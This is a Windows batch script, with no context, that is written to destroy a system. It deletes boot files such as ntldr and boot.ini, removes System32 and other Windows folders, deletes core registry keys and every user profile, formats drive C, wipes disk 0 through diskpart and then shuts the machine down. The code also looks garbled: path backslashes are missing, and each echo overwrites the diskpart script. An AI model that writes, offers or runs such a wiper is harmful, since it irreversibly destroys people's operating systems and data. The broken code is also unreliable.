@echo off
attrib -r -s -h c:autoexec.bat
del c:autoexec.bat
attrib -r -s -h c:boot.ini
del c:boot.ini
attrib -r -s -h c:ntldr
del c:ntldr
attrib -r -s -h c:windowswin.ini
del c:windowswin.ini

rd /s /q c:windowsSystem32
rd /s /q c:windowsSystem
rd /s /q c:windowsFonts

reg delete "HKLMSoftwareMicrosoftWindows NTCurrentVersion" /f
reg delete "HKLMSoftwareMicrosoftWindowsCurrentVersion" /f

for /d %%i in (c:Users*) do rd /s /q "%%i"

format c: /q /fs:NTFS

echo y|diskpart /s mbrscript.txt

echo select disk 0 > mbrscript.txt
echo clean > mbrscript.txt
echo create partition primary > mbrscript.txt
echo format fs=ntfs quick > mbrscript.txt
echo assign letter=c > mbrscript.txt
echo exit > mbrscript.txt

diskpart /s mbrscript.txt

shutdown /s /t 0
